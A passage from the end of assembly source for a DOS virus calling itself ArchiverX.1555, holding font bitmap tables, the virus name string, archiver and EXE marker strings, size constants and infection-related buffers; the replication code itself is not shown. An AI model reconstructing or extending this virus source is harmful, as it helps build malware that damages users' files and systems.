Font2Ofs	dw	Font2-Virus

Font3		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00110000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00001100b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b

Font3Ofs	dw	Font3-Virus

Font4		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00111100b
		db	01000010b
		db	01011010b
		db	01011010b
		db	01000010b
		db	00111100b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00111100b
		db	01000010b
		db	01011010b
		db	01011010b
		db	01000010b
		db	00111100b
		db	00000000b
		db	00000000b

Font4Ofs	dw	Font4-Virus

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                                
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

VirName		db	'ArchiverX.1555 -- Copyright (c) by DJ Sadovnikov'
Arhivat		db	'PKARRAHA'
NewEXE		db	'NEPELELX'

CodeSize	=	$ - Virus

Flag2		db	?
Temp		dd	?
CurPos		dd	?
FSize		dd	?
Header		db	18h dup (?)

MemSize		=	$ - Virus

Code		ends
		end	Virus
